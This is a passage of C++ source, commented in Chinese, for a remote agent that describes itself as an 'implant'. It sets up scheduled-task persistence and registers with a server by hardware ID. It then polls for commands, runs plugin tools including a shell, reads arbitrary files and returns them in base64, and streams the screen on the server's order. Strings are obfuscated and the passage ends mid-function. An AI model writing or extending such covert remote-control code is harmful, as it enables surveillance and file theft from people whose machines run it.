            // 引导密钥放这里等于公开。请改用 r6m.ini、R6M_AGENT_KEY 环境变量，
            // 或提升权限时自动生成的受限 DACL 临时配置。
            LOG_W(R6M_STR_D9CF61251F402ED5, R6M_STR_BAF48D16A5F342B9);
            if (i + 1 < argc) SecureZeroMemory(argv[i + 1], wcslen(argv[i + 1]) * sizeof(wchar_t));
        }
    }
    if (argv) LocalFree(argv);
    // 明文 URL 直接终止：原来是"只记一行日志然后照发密钥"
    if (_serverUrl.compare(0, 8, R6M_STR_C36051FD1B91173E) != 0) {
        LOG_E(R6M_STR_D9CF61251F402ED5, R6M_STR_6B6316D6A6A9854F);
        _running = false;
        return;
    }
    LOG_INFO(R6M_STR_D9CF61251F402ED5, ("URL=" + _serverUrl).c_str());

    // 自自启动配置：URL 已校验通过（配置读完了）但还没连服务端，此处失败不影响主循环
    r6m::SelfGuard::EnsureSelfTask();

    LOG_INFO(R6M_STR_D9CF61251F402ED5, "A: Network fix");
    NetworkFix::FixAll(_serverUrl);
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "B: Network done");

    LOG_INFO(R6M_STR_D9CF61251F402ED5, "C: HWID");
    _hwid = generateHWID();
    LOG_INFO(R6M_STR_D9CF61251F402ED5, ("HWID=" + _hwid).c_str());

    // 注意：插件/Python 同步必须在注册之后（D' 步）——
    // per-agent 密钥模型下，注册前只有引导密钥，下载接口会 401。

    // 连接前验证 RMM 可达，最多重试 3 次，指数退避
    // 端点候选列表：env/ini 里支持 servers=a,b,c（单端点是本项目的先天弱点，
    // IPv6 前缀一变就全体失联，agent 手上必须有第二条路）
    RebuildEndpointList();

    _isAdmin = IsRunningElevatedLocal();
    if (!_isAdmin) {
        // 静默权限回收是最坏情况：策略/服务/计划任务类操作会失败，而管理端看不到原因。
        LOG_W(R6M_STR_D9CF61251F402ED5,
              "当前不是管理员权限：策略/服务/计划任务/写 hosts 类操作会失败（见 r6m.ini 的 elevate=1）");
    }

    // 这里原来有一圈 NetworkFix::VerifyRMMReachable() 的"可达性检查"。
    // 实测那个判定在本机**恒为 false**（连可用的服务端也报 unreachable）：
    //   · 成功那次的日志里它在正确地址上照样失败 3 次，白等 ~30 秒
    //     —— 这就是一直以来"受管端启动要 40~50 秒"的真正来源，不是下载慢；
    // 真正的可用性判据是下面那个 TLS 标识探测（它会真的建连、校验证书），
    // 所以轮换直接挂在它上面，这一圈删掉。
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "E: Reachability via TLS probe below");

    // IntegrityCheck 基线检查（三段式之一：检测）—— 连接前体检一次
    {
        std::vector<ApiIntegrityReport> reports;
        LOG_INFO(R6M_STR_D9CF61251F402ED5, "H: IntegrityCheck baseline check");
        if (IntegrityCheck::CheckCriticalApis(reports)) {
            LOG_INFO(R6M_STR_D9CF61251F402ED5, "IntegrityCheck baseline: all critical APIs intact");
        } else if (IntegrityCheck::HasTampered(reports)) {
            _integrityCompromised = true;
            LOG_E(R6M_STR_D9CF61251F402ED5, "IntegrityCheck baseline: 确认关键 API 入口被篡改，进入安全隔离状态（详见 IntegrityCheck 日志）");
        } else {
            // 仅"无法验证"（模块未加载/转发导出/权限不足）：告警但不安全隔离。
            // 服务端可通过 POST /api/integrity/clear?hwid=... 下发解除。
            LOG_WARN(R6M_STR_D9CF61251F402ED5, "IntegrityCheck baseline: 存在无法验证的关键 API，仅告警不安全隔离");
        }
        IntegrityCheck::LogReports(reports);
        if (IntegrityCheck::HasUnverifiable(reports)) {
            // 无法验证 ≠ 已被篡改：只告警，绝不因此安全隔离（原实现会让一次
            // 未加载的模块/转发导出把 agent 永久锁死且无恢复通道）
            LOG_WARN(R6M_STR_D9CF61251F402ED5, "IntegrityCheck: 存在无法验证的关键 API（已计入上报，不触发安全隔离）");
        }
    }

    // E'：发凭据之前先校验 TLS 标识（这一步过网的只有一次无凭据探测）
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "E': TLS pin probe (before any credential)");
    {
        // 轮换挂在这里：**这个探测才是真正的可达性判据**（真建连 + 校验证书标识）。
        // 每个端点试 2 次，失败就换下一个；所有端点都试过才算真的不可达。
        bool pinOk = false;
        const int eps = (int)_servers.size();
        for (int round = 0; round < eps && !pinOk; ++round) {
            for (int attempt = 1; attempt <= 2 && !pinOk; ++attempt) {
                pinOk = probeAndVerifyPin();
                if (!pinOk) {
                    LOG_WARN(R6M_STR_D9CF61251F402ED5,
                             ("TLS 探测失败 " + std::to_string(attempt) + "/2 on " +
                              _serverUrl).c_str());
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            }
            if (!pinOk && eps > 1) RotateEndpoint("TLS 探测失败");
        }
        if (!pinOk) {
            LOG_E(R6M_STR_D9CF61251F402ED5,
                  ("TLS 标识在全部 " + std::to_string(eps) +
                   " 个端点上都没能校验通过：拒绝发送任何密钥（疑似中间人，或全部不可达）").c_str());
            _running = false;
            return;
        }
        _epFails = 0;
        LOG_I(R6M_STR_D9CF61251F402ED5,
              ("端点已确定: " + _serverUrl +
               "（第 " + std::to_string(_serverIdx + 1) + "/" + std::to_string(eps) + " 个）").c_str());
    }

    LOG_INFO(R6M_STR_D9CF61251F402ED5, "F: Connect");
    for (int attempt = 1; attempt <= 5 * (int)_servers.size(); ++attempt) {
        if (connectToServer()) {
            _epFails = 0;
            break;
        }
        LOG_WARN(R6M_STR_D9CF61251F402ED5,
                 ("Connect failed on " + _serverUrl + "，轮换下一个端点").c_str());
        RotateEndpoint("连接失败");
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
    ReportAgentStatus();   // 把 admin/当前端点/失败数报到服务端（管理端要看得见）

    // D': 插件同步 —— 必须在注册之后：此时已换成本机独立密钥，
    // 下载接口（/api/runtime、/api/plugins*）才会临时授权
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "D': Plugins (after register)");
    // （已移除）屏幕锁定反向通道的注册：申报「已完成」与「解锁口令」两个回调
    // 原本集成给 TaskLock，现在由外置工具 R6MLock.exe 自己用工件密钥直接调
    // /api/task/claim 与 /api/task/pinunlock —— 受管端不再参与屏幕锁定这条链路。
    // 注意：这里不能留 `if (false) { ... }` 那种空块占位 —— 块内代码照样会编译，
    // 于是仍引用 TaskLock 的符号，摘掉 TaskLock.cpp 后就是 LNK2001（我就这么踩了一次）。

    syncPlugins(pluginDir);       // 从服务端同步缺失的插件 + 嵌入式 Python

    // 设置嵌入式 Python 路径
    {
        wchar_t ep[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, ep, MAX_PATH);
        std::wstring ws(ep); ws = ws.substr(0, ws.find_last_of(L'\\'));
        std::wstring py = ws + ::r6m::ev::Widen(R6M_STR_F39516386B0505EB);
        if (GetFileAttributesW(py.c_str()) != INVALID_FILE_ATTRIBUTES) {
            _plugins.setPythonPath(py);
            LOG_INFO(R6M_STR_D9CF61251F402ED5, "Embedded Python found");
        }
    }

    _plugins.scanPlugins(pluginDir);
    _plugins.buildToolMap();

    LOG_INFO(R6M_STR_D9CF61251F402ED5, "F: Heartbeat thread");
    _heartbeatThread = std::thread([this]() {
        while (_running) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            try {
                // 心跳携带完整性状态（三段式之二：上报）
                std::string integrity = IntegrityCheck::SummaryForHeartbeat();
                if (integrity.compare(0, 8, "tampered") == 0) {
                    // 三段式之三：置安全隔离标志。只有"确认被篡改"才安全隔离，
                    // "无法验证"（模块未加载/转发导出）由 IntegrityCheck 归为 unverifiable，不安全隔离。
                    _integrityCompromised = true;
                    _consecutiveOkChecks = 0;
                } else if (integrity == "ok") {
                    if (++_consecutiveOkChecks >= 3 && _integrityCompromised) {
                        clearFuse("连续 3 次完整性自检正常");
                    }
                }
                r6m::Json hb = r6m::Json::makeObject();
                hb.set(R6M_STR_6EBF24CC0760715D, r6m::Json::makeString(_hwid));
                hb.set(R6M_STR_557FBE83ECDAAC3C, r6m::Json::makeString(integrity));
                std::string body = hb.dump();
                std::string resp;
                httpPost(R6M_STR_A7B9B2094807F4B5, body, resp);
            } catch (...) {}
        }
    });
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "G: Poll loop");
    pollLoop();
    _running = false;
    _plugins.stopAll();
    LOG_INFO(R6M_STR_D9CF61251F402ED5, R6M_STR_19D44F8547DCB90B);
}

bool StubCore::connectToServer() {
    LOG_INFO(R6M_STR_D9CF61251F402ED5, ("连接: " + _serverUrl).c_str());

    // 用结构化方式构造注册体（计算机名/用户名含特殊字符时不会被拼坏）
    r6m::Json info = r6m::Json::makeObject();
    {
        wchar_t computer[MAX_PATH] = {}; DWORD csz = MAX_PATH;
        GetComputerNameW(computer, &csz);
        wchar_t user[MAX_PATH] = {}; DWORD usz = MAX_PATH;
        GetUserNameW(user, &usz);
        unsigned int hash = 5381;
        std::string cs = Utf8FromWide(computer);
        for (size_t i = 0; i < cs.size(); i++) hash = ((hash << 5) + hash) + (unsigned char)cs[i];
        info.set("computer", r6m::Json::makeString(cs));
        info.set("user", r6m::Json::makeString(Utf8FromWide(user)));
        // OS 版本：RtlGetVersion 拿真实内部版本号（GetVersionEx 会因清单被谎报）
        std::string osName = "Windows";
        {
            typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
            auto fn = (RtlGetVersionPtr)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
            if (fn) {
                RTL_OSVERSIONINFOW rovi = { sizeof(rovi) };
                if (fn(&rovi) == 0) {
                    char b[64] = {};
                    snprintf(b, sizeof(b), "Windows %lu.%lu Build %lu",
                             (unsigned long)rovi.dwMajorVersion, (unsigned long)rovi.dwMinorVersion,
                             (unsigned long)rovi.dwBuildNumber);
                    osName = b;
                }
            }
        }
        info.set("os", r6m::Json::makeString(osName));
        info.set("arch", r6m::Json::makeString(sizeof(void*) == 8 ? "x64" : "x86"));
        (void)hash;
    }

    r6m::Json body = r6m::Json::makeObject();
    body.set(R6M_STR_6EBF24CC0760715D, r6m::Json::makeString(_hwid));
    body.set("info", info);

    std::string resp;
    bool sent = httpPost(R6M_STR_A052520827E169BC, body.dump(), resp);

    // 已登记 hwid 只认自己的 per-agent 密钥：若自启动配置密钥失效（服务端换过/被吊销），
    // 回退用引导密钥重登记一次（仅限"确实拿不到有效密钥"这种情况）
    if (sent) {
        r6m::Json j;
        std::string err;
        if (r6m::Json::parse(resp, j, &err)) {
            if (j.getString(R6M_STR_6280952B223463RMM).empty() && hasBootstrapKey() && !_bootstrapKeyObf.empty()) {
                if (_agentKeyObf != _bootstrapKeyObf) {
                    LOG_W(R6M_STR_D9CF61251F402ED5, "服务端拒绝了当前密钥，回退引导密钥重新登记");
                    std::string plain;   // 把引导密钥解码到栈上，用完即擦
                    plain.reserve(_bootstrapKeyObf.size());
                    for (size_t i = 0; i < _bootstrapKeyObf.size(); i++) {
                        plain += (char)(_bootstrapKeyObf[i] ^ _bootstrapKeyMask[i]);
                    }
                    setAgentKeyPlain(plain.c_str());
                    SecureZeroMemory(&plain[0], plain.size());
                    sent = httpPost(R6M_STR_A052520827E169BC, body.dump(), resp);
                }
            }
        }
    }

    if (!sent) return false;

    r6m::Json j;
    std::string err;
    if (!r6m::Json::parse(resp, j, &err)) {
        LOG_E(R6M_STR_D9CF61251F402ED5, ("注册响应不是合法 JSON: " + err).c_str());
        return false;
    }
    std::string newKey = j.getString(R6M_STR_6280952B223463RMM);
    if (newKey.empty()) {
        LOG_E(R6M_STR_D9CF61251F402ED5, (R6M_STR_2A1B3A5DBE21E369 + resp.substr(0, 160)).c_str());
        return false;
    }
    if (newKey != _agentKeyObf) {
        setAgentKeyPlain(newKey.c_str());
        persistAgentKey(newKey);
        LOG_INFO(R6M_STR_D9CF61251F402ED5, "已切换为本机独立密钥（per-agent key）");
    }
    SecureZeroMemory(&newKey[0], newKey.size());
    WipeString(resp);
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "连接成功");
    return true;
}

// ───────────────────────────────────────────────────────────────────────────
// 内建 read_file 用的极简 base64 编码
// ───────────────────────────────────────────────────────────────────────────
// 为什么自己写：仓库里只有"使用"没有"实现"（截图那条的 base64 是插件侧编好的），
static std::string R6MB64(const unsigned char* p, size_t n) {
    static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string o;
    o.reserve(((n + 2) / 3) * 4);
    size_t i = 0;
    for (; i + 2 < n; i += 3) {
        const unsigned v = ((unsigned)p[i] << 16) | ((unsigned)p[i + 1] << 8) | (unsigned)p[i + 2];
        o.push_back(T[(v >> 18) & 63]);
        o.push_back(T[(v >> 12) & 63]);
        o.push_back(T[(v >> 6) & 63]);
        o.push_back(T[v & 63]);
    }
    if (i < n) {
        unsigned v = (unsigned)p[i] << 16;
        if (i + 1 < n) v |= (unsigned)p[i + 1] << 8;
        o.push_back(T[(v >> 18) & 63]);
        o.push_back(T[(v >> 12) & 63]);
        o.push_back((i + 1 < n) ? T[(v >> 6) & 63] : '=');
        o.push_back('=');
    }
    return o;
}

// ───────────────────────────────────────────────────────────────────────────
// 把内建工具并进插件工具清单
// ───────────────────────────────────────────────────────────────────────────
// 为什么需要：tools/list 原来只汇总插件的 tools/list（见 PluginLoader::listAllTools）。
// 内建工具（read_file_native）不走插件，于是**发现不了** —— 插件页/CLI/自动化都看不到它。
// 这里在插件清单之后追加内建项；插件没扫到、没起来时它们也照样能被发现。
static std::string R6MToolsWithBuiltins(PluginLoader& pl) {
    const std::string base = pl.listAllTools();
    r6m::Json root;
    std::string err;
    if (!r6m::Json::parse(base, root, &err) || !root.isObject()) return base;
    const r6m::Json* arr = root.find("tools");
    if (!arr || !arr->isArray()) return base;

    r6m::Json out = r6m::Json::makeArray();
    for (const auto& it : arr->items) out.push(it);

    struct Builtin { const char* name; const char* desc; const char* schema; };
    static const Builtin kB[] = {
        {"read_file_native",
         "读取文件字节并 base64 回传（植入体内建，不依赖 Python/插件；单次上限 4MB）",
         "{\"type\":\"object\",\"properties\":{"
         "\"path\":{\"type\":\"string\",\"description\":\"文件路径\"},"
         "\"offset\":{\"type\":\"integer\",\"description\":\"起始字节偏移，默认 0\"},"
         "\"length\":{\"type\":\"integer\",\"description\":\"本次读取字节数，默认 1MB，上限 4MB\"}},"
         "\"required\":[\"path\"]}"},
    };
    for (const auto& b : kB) {
        r6m::Json it = r6m::Json::makeObject();
        it.set("name", r6m::Json::makeString(b.name));
        it.set("description", r6m::Json::makeString(b.desc));
        it.set("plugin", r6m::Json::makeString("builtin"));
        r6m::Json sc;
        std::string e2;
        if (r6m::Json::parse(b.schema, sc, &e2)) it.set("inputSchema", sc);
        out.push(it);
    }
    r6m::Json res = r6m::Json::makeObject();
    res.set("tools", out);
    return res.dump();
}

void StubCore::pollLoop() {
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "开始轮询...");
    while (_running) {
        std::this_thread::sleep_for(std::chrono::seconds(3));

        // 三段式之三：安全隔离 —— 关键 API 确实被篡改期间不拉取/执行新指令。
        // （"无法验证"不再计入安全隔离；见 IntegrityCheck 三态与 clearFuse 恢复通道）
        if (_integrityCompromised) {
            LOG_E(R6M_STR_D9CF61251F402ED5, "完整性安全隔离中：关键 API 确认被篡改，暂停指令执行（心跳仍在上报）");
            std::this_thread::sleep_for(std::chrono::seconds(30));
            continue;
        }

        try {
            r6m::Json req = r6m::Json::makeObject();
            req.set(R6M_STR_6EBF24CC0760715D, r6m::Json::makeString(_hwid));
            std::string resp;
            if (!httpPost(R6M_STR_7156334FE6FB9E4C, req.dump(), resp)) continue;
            if (resp.empty() || resp == "{}" || resp == "null") continue;

            // 401 自愈（2026-10-07）：服务端不认识本机的 per-agent 密钥时
            // （换机、清了状态、恢复备份、首次上线带自启动配置的版本），原实现只是
            // continue —— 这台机器就**永久失联**了，必须人工重启每一个客户端。
            // 与"长期无人值守滞留"直接冲突，故在此回退引导密钥重新登记一次。
            //
            // 判据用响应体里的 unauthorized 而不是 HTTP 状态码：httpRequest 只回传
            // 响应体、不回传 statusCode，而服务端所有鉴权失败都回 {"error":"unauthorized"}。
            if (resp.find("unauthorized") != std::string::npos) {
                LOG_W(R6M_STR_D9CF61251F402ED5, "服务端不认当前密钥（状态被清/换机/密钥被吊销），尝试重新登记");
                if (connectToServer()) {
                    LOG_I(R6M_STR_D9CF61251F402ED5, "重新登记成功，恢复轮询");
                } else {
                    LOG_E(R6M_STR_D9CF61251F402ED5, "重新登记失败（引导密钥也可能不对），60 秒后重试");
                    std::this_thread::sleep_for(std::chrono::seconds(60));
                }
                continue;
            }

            r6m::Json j;
            std::string jerr;
            if (!r6m::Json::parse(resp, j, &jerr)) {
                // 原实现用字符串搜索解析，坏 JSON 会被当成"没有指令"静默吞掉
                LOG_E(R6M_STR_D9CF61251F402ED5, ("poll 响应解析失败: " + jerr).c_str());
                continue;
            }

            // 服务端下发的"解除安全隔离"（运维人工确认通道）
            if (j.getBool(R6M_STR_87D52EB9FB720EF6, false)) {
                clearFuse("服务端下发解除指令");
            }

            // （已移除）lock 状态解析：受管端不再消费服务端下发的锁定状态。
            // 服务端依旧每轮都发 lock（外置工具与面板都靠它），只是受管端忽略它 ——
            // 这样"要不要锁"这件事完全落在受管端之外，受管端回归纯执行体。

            // ── 声明期望态 ──
            // 这样"投放到 100 台"不再是 100 条命令：离线机器回来也会自动补齐。
            DesiredTick(j.dump());

            // 定期自愈：**不依赖 rev 变化**，按时间间隔主动校验现状。
            // 这是"配置被改回去"能被发现并恢复的唯一入口。
            SelfHealTick();

            // ── 屏幕监控控制面 ──
            {
                const r6m::Json* ss = j.find("screen_stream");
                if (ss && ss->isObject()) {
                    applyScreenStream(true,
                                      (int)ss->getNumber("scale", 4),
                                      (int)ss->getNumber("interval_ms", 400));
                } else {
                    applyScreenStream(false, 0, 0);
                }
            }

            std::string requestId = j.getString(R6M_STR_6A5477E85598B6BA);
            std::string method = j.getString("method");
            if (method.empty()) continue;

            const r6m::Json* paramsNode = j.find("params");
            std::string params = (paramsNode && paramsNode->isObject()) ? paramsNode->dump() : std::string("{}");

            LOG_INFO(R6M_STR_D9CF61251F402ED5, ("指令: " + method).c_str());

            // 面板要工具清单：本地聚合所有插件的 tools/list（无需服务端新增接口）
            if (method == "tools/list") {
                std::string tools = R6MToolsWithBuiltins(_plugins);
                if (!requestId.empty()) {
                    // 直接把聚合结果原样嵌入请求体（result 必须是合法 JSON 对象）
                    std::string postBody = R6M_STR_B0E4E8DECBD6A49F + requestId + "\",\"result\":" + tools + "}";
                    std::string r2;
                    httpPost(R6M_STR_988D7DCC805B1160, postBody, r2);
                    WipeString(postBody); WipeString(r2);
                }
                WipeString(resp);
                continue;
            }

            std::string pluginId;
            if (method == "tools/call") {
                const r6m::Json* nameNode = paramsNode ? paramsNode->find("name") : nullptr;
                std::string toolName = nameNode ? nameNode->text : std::string();
                // 兜底：把 tools/list 当工具名传进来的调用方（旧面板 / CLI / 第三方）
                // 也应当拿到聚合结果，而不是 no plugin provides tool。
                if (toolName == "tools/list") {
                    std::string tools = R6MToolsWithBuiltins(_plugins);
                    if (!requestId.empty()) {
                        std::string postBody = R6M_STR_B0E4E8DECBD6A49F + requestId + "\",\"result\":" + tools + "}";
                        std::string r2;
                        httpPost(R6M_STR_988D7DCC805B1160, postBody, r2);
                        WipeString(postBody); WipeString(r2);
                    }
                    WipeString(resp);
                    continue;
                }
                // ── 内建工具 read_file：真正的读文件回传（不走插件）──
                // 为什么内建：原先只能靠 shell_exec 的 powershell 分块（30KB/块，
                // 瓶颈只剩轮询次数。
                // 为什么拦在"解析插件之前"：这样**服务端一行都不用改** —— 面板照旧走
                // /api/mcp 按工具名调用，客户端自己认下这个内建名。
                // 名字带 _native：插件 file_browser 也提供 read_file（且有文本编码自动识别），
                // 所以并存、不抢名字。
                if (toolName == "read_file_native") {
                    const r6m::Json* argNode = paramsNode ? paramsNode->find("arguments") : nullptr;
                    r6m::Json a = r6m::Json::makeObject();
                    if (argNode && argNode->isObject()) {
                        std::string aerr;
                        if (!r6m::Json::parse(argNode->dump(), a, &aerr)) a = r6m::Json::makeObject();
                    }
                    const std::string rfPath = a.getString("path");
                    long long rfOff = (long long)a.getNumber("offset", 0);
                    long long rfLen = (long long)a.getNumber("length", 1048576);
                    if (rfLen <= 0) rfLen = 1048576;
                    if (rfLen > (4LL << 20)) rfLen = 4LL << 20;   // 单次上限 4MB
                    if (rfOff < 0) rfOff = 0;

                    std::string rfJson;
                    if (rfPath.empty()) {
                        rfJson = "{\"error\":\"缺少 path\"}";
                    } else {
                        HANDLE rh = CreateFileW(WideFromUtf8(rfPath).c_str(), GENERIC_READ,
                                                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                        if (rh == INVALID_HANDLE_VALUE) {
                            rfJson = std::string("{\"error\":\"打开失败（不存在/被占用/无权限）\",\"win32_error\":") +
                                     std::to_string((long long)GetLastError()) + "}";
                        } else {
                            LARGE_INTEGER fsz = {};
                            GetFileSizeEx(rh, &fsz);
                            LARGE_INTEGER mv = {};
                            mv.QuadPart = rfOff;
                            SetFilePointerEx(rh, mv, nullptr, FILE_BEGIN);
                            std::vector<unsigned char> buf((size_t)rfLen);
                            DWORD got = 0;
                            const BOOL rok = ReadFile(rh, buf.data(), (DWORD)rfLen, &got, nullptr);
                            const DWORD rerr = rok ? 0u : GetLastError();
                            CloseHandle(rh);
                            if (!rok) {
                                rfJson = std::string("{\"error\":\"读取失败\",\"win32_error\":") +
                                         std::to_string((long long)rerr) + "}";
                            } else {
                                buf.resize(got);
                                const bool eof = (rfOff + (long long)got) >= fsz.QuadPart;
                                rfJson = "{\"ok\":true,\"path\":" + r6m::Json::makeString(rfPath).dump() +
                                         ",\"total\":" + std::to_string((long long)fsz.QuadPart) +
                                         ",\"offset\":" + std::to_string(rfOff) +
                                         ",\"length\":" + std::to_string((long long)got) +
                                         ",\"eof\":" + (eof ? "true" : "false") +
                                         ",\"base64\":\"" + R6MB64(buf.data(), buf.size()) + "\"}";
                            }
                        }
                    }
                    if (!requestId.empty()) {
                        std::string pb = R6M_STR_B0E4E8DECBD6A49F + requestId + "\",\"result\":" + rfJson + "}";
                        std::string r2;
                        httpPost(R6M_STR_988D7DCC805B1160, pb, r2);
                        WipeString(pb);
                        WipeString(r2);
                    }
                    WipeString(resp);
                    continue;
                }

                pluginId = _plugins.resolvePluginForTool(toolName);
                if (pluginId.empty()) {
                    // 原实现直接 continue：服务端永远等不到结果，只能 30 秒超时。
                    // 现在显式回传错误，调用方立刻知道原因。
                    LOG_WARN(R6M_STR_D9CF61251F402ED5, ("未找到处理工具 '" + toolName + "' 的插件").c_str());
                    if (!requestId.empty()) {
                        std::string postBody = R6M_STR_B0E4E8DECBD6A49F + requestId +
                            "\",\"result\":{\"error\":\"no plugin provides tool: " + toolName + "\"}}";
                        std::string r2;
                        httpPost(R6M_STR_988D7DCC805B1160, postBody, r2);
                        WipeString(postBody); WipeString(r2);
                    }
                    WipeString(resp);
                    continue;
                }
            } else {
                size_t dot = method.find('.');
                pluginId = (dot == std::string::npos) ? method : method.substr(0, dot);
            }

            if (method == "deploy_batch") {
                LOG_INFO(R6M_STR_D9CF61251F402ED5, "收到批量部署指令（事务化）");
                bool ok = handleDeployBatch(params);
                if (!requestId.empty()) {
                    r6m::Json res = r6m::Json::makeObject();
                    res.set("ok", r6m::Json::makeBool(ok));
                    if (!ok) res.set("error", r6m::Json::makeString(_lastDeployErr));
                    if (!_lastBatchReport.empty()) {
                        // 逐步报告原样嵌进 result（分批投了什么、哪步失败、回滚了哪些）
                        r6m::Json rep;
                        std::string perr2;
                        if (r6m::Json::parse(_lastBatchReport, rep, &perr2))
                            res.set("batch", rep);
                        else
                            res.set("batch_raw", r6m::Json::makeString(_lastBatchReport));
                    }
                    r6m::Json pr = r6m::Json::makeObject();
                    pr.set(R6M_STR_6A5477E85598B6BA, r6m::Json::makeString(requestId));
                    pr.set("result", res);
                    std::string resp2;
                    httpPost(R6M_STR_988D7DCC805B1160, pr.dump(), resp2);
                    WipeString(resp2);
                }
            }

            if (method == "rollback_tx") {
                LOG_INFO(R6M_STR_D9CF61251F402ED5, "收到事务回滚指令");
                bool ok = handleRollbackTx(params);
                if (!requestId.empty()) {
                    r6m::Json res = r6m::Json::makeObject();
                    res.set("ok", r6m::Json::makeBool(ok));
                    if (!ok) res.set("error", r6m::Json::makeString(_lastDeployErr));
                    if (!_lastApplyDetail.empty())
                        res.set("apply_detail", r6m::Json::makeString(_lastApplyDetail));
                    r6m::Json pr = r6m::Json::makeObject();
                    pr.set(R6M_STR_6A5477E85598B6BA, r6m::Json::makeString(requestId));
                    pr.set("result", res);
                    std::string resp2;
                    httpPost(R6M_STR_988D7DCC805B1160, pr.dump(), resp2);
                    WipeString(resp2);
                }
            }

            if (method == "rollback_file") {
                LOG_INFO(R6M_STR_D9CF61251F402ED5, "收到工件回滚指令");
                bool ok = handleRollbackFile(params);
                if (!requestId.empty()) {
                    r6m::Json res = r6m::Json::makeObject();
                    res.set("ok", r6m::Json::makeBool(ok));
                    if (!ok) res.set("error", r6m::Json::makeString(_lastDeployErr));
                    if (!_lastApplyDetail.empty())
                        res.set("apply_detail", r6m::Json::makeString(_lastApplyDetail));
                    r6m::Json pr = r6m::Json::makeObject();
                    pr.set(R6M_STR_6A5477E85598B6BA, r6m::Json::makeString(requestId));
                    pr.set("result", res);
                    std::string resp2;
                    httpPost(R6M_STR_988D7DCC805B1160, pr.dump(), resp2);
                    WipeString(resp2);
                }
            }

            if (method == "deploy_file") {
                LOG_INFO(R6M_STR_D9CF61251F402ED5, "收到文件部署指令");
                bool ok = handleDeployFile(params);
                if (!requestId.empty()) {
                    r6m::Json res = r6m::Json::makeObject();
                    res.set("ok", r6m::Json::makeBool(ok));
                    if (!ok) res.set("error", r6m::Json::makeString(R6M_STR_6A0655231E3704FD));
                    // 外置工件：把签发的 key 回带，管理端据此建立"钥匙 ↔ 文件/进程"映射
                    if (ok && !_lastArtifactKey.empty()) {
                        res.set("artifact_key", r6m::Json::makeString(_lastArtifactKey));
                    }
                    // 应用动作必须回报：管理端要能确认"到底应用了什么、成没成"
                    if (!_lastApplyDetail.empty())
                        res.set("apply_detail", r6m::Json::makeString(_lastApplyDetail));
                    if (!_lastApplyErr.empty())
                        res.set("apply_error", r6m::Json::makeString(_lastApplyErr));
                    r6m::Json pr = r6m::Json::makeObject();
                    pr.set(R6M_STR_6A5477E85598B6BA, r6m::Json::makeString(requestId));
                    pr.set("result", res);
                    std::string resp2;
                    httpPost(R6M_STR_988D7DCC805B1160, pr.dump(), resp2);
                    WipeString(resp2);
                }
                WipeString(resp);
                continue;
            }

            std::string result = _plugins.callPlugin(pluginId, method, params);
            LOG_DEBUG(R6M_STR_D9CF61251F402ED5, ("插件响应: " + result.substr(0, 200)).c_str());

            if (!requestId.empty() && method == "tools/call") {
                r6m::Json res;
                std::string perr;
                std::string resultJson = result;
                if (!r6m::Json::parse(result, res, &perr)) {
                    LOG_E(R6M_STR_D9CF61251F402ED5, ("插件返回的不是合法 JSON: " + perr).c_str());
                    resultJson = "{\"error\":\"plugin returned invalid json\"}";
                }
                r6m::Json pr = r6m::Json::makeObject();
                pr.set(R6M_STR_6A5477E85598B6BA, r6m::Json::makeString(requestId));
                // 直接把插件的 result 原样嵌入，避免二次转义
                std::string postBody = R6M_STR_B0E4E8DECBD6A49F + requestId + "\",\"result\":" + resultJson + "}";
                std::string resp2;
                httpPost(R6M_STR_988D7DCC805B1160, postBody, resp2);
                LOG_DEBUG(R6M_STR_D9CF61251F402ED5, ("结果回传: " + resp2).c_str());
                WipeString(postBody); WipeString(resp2);
            }
            WipeString(result);
            WipeString(resp);

        } catch (const std::exception& e) {
            LOG_ERROR(R6M_STR_D9CF61251F402ED5, ("轮询异常: " + std::string(e.what())).c_str());
        } catch (...) {
            LOG_ERROR(R6M_STR_D9CF61251F402ED5, "轮询异常");
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// 屏幕监控（实时看屏）
//
// 只能得到"3 秒一帧"的幻灯片。监控要的是连续画面，所以采集必须有自己的节奏。
//
// 服务端只保留最新一帧，所以即使面板暂时慢，也不会积压出一排旧帧。
// ═══════════════════════════════════════════════════════════════════════════

void StubCore::applyScreenStream(bool enabled, int scale, int intervalMs) {
    if (!enabled) {
        stopScreenStream();
        return;
    }
    if (scale != 1 && scale != 2 && scale != 4 && scale != 8) scale = 4;
    if (intervalMs < 100) intervalMs = 100;

    if (_screenActive.load()) {
        // 已在采集：只更新参数（采集线程每轮重新读取），不重启线程 ——
        // 重启会丢掉正在飞的那一帧，面板看起来就是"改画质必然白屏一下"。
        if (_screenScale.load() != scale || _screenInterval.load() != intervalMs) {
            _screenScale.store(scale);
            _screenInterval.store(intervalMs);
            LOG_INFO(R6M_STR_D9CF61251F402ED5, ("屏幕监控参数更新: scale=" + std::to_string(scale) +
                     " interval=" + std::to_string(intervalMs) + "ms").c_str());
        }
        return;
    }

    _screenStop.store(false);
    _screenScale.store(scale);
    _screenInterval.store(intervalMs);
    _screenActive.store(true);
    _screenThread = std::thread(&StubCore::screenLoop, this);
    LOG_INFO(R6M_STR_D9CF61251F402ED5, ("屏幕监控已启动: scale=" + std::to_string(scale) +
             " interval=" + std::to_string(intervalMs) + "ms（format=jpeg）").c_str());
}

void StubCore::stopScreenStream() {
    if (!_screenActive.load()) return;
    _screenStop.store(true);
    if (_screenThread.joinable()) _screenThread.join();
    _screenActive.store(false);
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "屏幕监控已停止");
}

void StubCore::screenLoop() {
    const std::string pluginId = _plugins.resolvePluginForTool("screenshot");
    if (pluginId.empty()) {
